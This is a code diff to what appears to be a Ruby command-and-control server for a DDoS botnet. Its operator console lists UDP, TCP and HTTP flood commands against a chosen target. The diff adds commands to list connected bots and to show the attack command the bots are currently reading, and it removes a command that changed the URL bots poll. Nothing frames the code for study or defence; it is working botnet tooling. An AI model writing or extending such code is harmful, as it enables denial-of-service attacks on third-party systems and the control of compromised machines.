@@ -61,8 +61,9 @@ Made with <3 by AM-77\n\n"
           master.puts "tcp <target> <port> <time (ms)> <threads> Perform a TCP flood on <target>:<port> for <time> ms using <threads> threads"
           master.puts "http <target> <time (ms)> <threads>       Perform a HTTP flood on <target> for <time> ms using <threads> threads"
           master.puts "botcount                                  Shows how many bots are connected"
+          master.puts "botlist                                   Show all current bots"
           master.puts
-          master.puts "urlup <newurl>                            Update the url for bots to get connections from"
+          master.puts "current                                   Shows the current command the bots are reading"
           master.puts
           master.puts "clear                                     Clear bot command (always do this after an attack command)"
           master.puts
@@ -71,8 +72,9 @@ Made with <3 by AM-77\n\n"
           master.puts(`wc -l bots.txt | awk '{print $1}'`)  # Some minor bash-fu
         elsif cmd.include?("udp") || cmd.include?("tcp") || cmd.include?("http")
           writeCmd(cmd) if checkAttackCmd(cmd)
-        elsif cmd == "urlup" && split.length == 2
-          writeCmd(cmd)
+        elsif cmd == "current"
+          current_cmd = File.open("cmd.txt", 'r').read
+          master.puts current_cmd
         elsif cmd == "clear"
           writeCmd("NONE")
         elsif cmd == ""
@@ -81,6 +83,9 @@ Made with <3 by AM-77\n\n"
           master.puts "Bye bye!"
           master.close
           cmd = ""
+        elsif cmd == "botlist"
+          botlist = File.open("bots.txt", 'r')
+          master.puts botlist.read
         else
           master.puts "\033[31m Unknown command: #{cmd}\033[0m"
         end
